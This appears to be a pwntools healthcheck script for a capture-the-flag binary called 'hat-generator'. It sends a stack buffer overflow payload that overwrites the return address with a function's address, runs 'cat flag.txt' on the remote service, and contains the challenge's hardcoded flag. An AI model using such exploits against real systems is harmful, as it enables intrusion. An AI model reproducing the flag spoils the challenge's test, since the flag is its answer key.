from pwn import *
import argparse

FLAG = b'SOOCTF{th4t_w45nt_4_h4t}'
TIMEOUT = 5

def solve(host, port):
    context.log_level = 'error'
    elf = ELF('dist/hat-generator')

    def start():
        return remote(host, int(port))

    eip_off = 44
    technology_addr = elf.symbols['Technology']

    try:
        io = start()
        payload = flat([
            b"A"*eip_off,
            p32(technology_addr)
        ])
        io.sendline(payload)
        io.sendline(b'cat flag.txt')
        r = io.recvuntil(FLAG,timeout=TIMEOUT)
        if r != '':
            return True
        else:
            return False
    except:
        return False

if __name__=='__main__':
    parser = argparse.ArgumentParser(prog="Healthcheck",description='Make sure the \'Queensland University of 0x80491b6\' challenge is still working.')
    parser.add_argument('host')
    parser.add_argument('port')
    args = parser.parse_args()
    solved = solve(args.host, args.port)
    context.log_level = 'info'
    if solved:
        log.success('Passed.')
        exit(0)
    else:
        log.failure('Failed.')
        exit(1)
